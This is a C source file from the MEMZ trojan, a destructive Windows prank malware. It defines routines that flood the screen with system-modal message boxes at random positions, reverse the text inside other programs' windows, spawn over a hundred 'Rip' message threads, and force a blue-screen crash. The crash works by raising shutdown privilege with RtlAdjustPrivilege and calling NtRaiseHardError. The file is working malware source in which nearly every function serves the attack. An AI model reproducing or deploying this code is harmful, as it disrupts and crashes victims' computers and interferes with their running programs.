#include "MEMZ.h"

// Random-Generator
HCRYPTPROV hProv;
int Random() {
	if (hProv == NULL)
		if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT)) {
			MessageBox(NULL, L"CryptAcquireContext Failed", L"MEMZ", MB_OK);
			ExitProcess(EXIT_FAILURE);
		}
			
	int out;
	CryptGenRandom(hProv, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}

// MessageBoxHook
LRESULT CALLBACK MsgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hWnd = (HWND)wParam;

			int x = Random() % (scrw - pcs->cx);
			int y = Random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

// MessageBoxThread's
DWORD WINAPI MessageBoxThread(LPVOID lpParameter) {
	HHOOK Hook = SetWindowsHookEx(WH_CBT, MsgBoxHook, NULL, GetCurrentThreadId());
	MessageBox(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(Hook);

	return 0;
}
DWORD WINAPI RipMessageThread(LPVOID lpParameter) {
	HHOOK Hook = SetWindowsHookEx(WH_CBT, MsgBoxHook, NULL, GetCurrentThreadId());
	MessageBox(NULL, Msgs[Random() % nMsgs], L"MEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(Hook);

	return 0;
}

// String-Reverse
void StrReverse(LPWSTR str) {
	int len = lstrlen(str);

	if (len <= 1)
		return;

	WCHAR c;
	int i, j;
	for (i = 0, j = len - 1; i < j; i++, j--) {
		c = str[i];
		str[i] = str[j];
		str[j] = c;
	}

	for (i = 0; i < len - 1; i++) {
		if (str[i] == L'\n' && str[i + 1] == L'\r') {
			str[i] = L'\r';
			str[i + 1] = L'\n';
		}
	}
}
BOOL CALLBACK EnumChildProc(HWND hWnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	if (SendMessageTimeout(hWnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		StrReverse(str);
		SendMessageTimeout(hWnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}

	GlobalFree(str);

	return TRUE;
}

// KillWindows Host
void KillWindows() {
	// Spawn KillMessages
	for (int i = 0; i < 0x7f; i++) {
		CreateThread(NULL, 4096, &RipMessageThread, NULL, NULL, NULL);
		Sleep(0xf);
	}
	
#ifdef BSOD
	KillWindowsInstant();
#else
	Sleep(0x7f);
	ExitProcess(EXIT_SUCCESS);
#endif
}

#ifdef BSOD
// BSoD Windows
void KillWindowsInstant() {
	BOOLEAN bl;
	ULONG Response;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);
}
#endif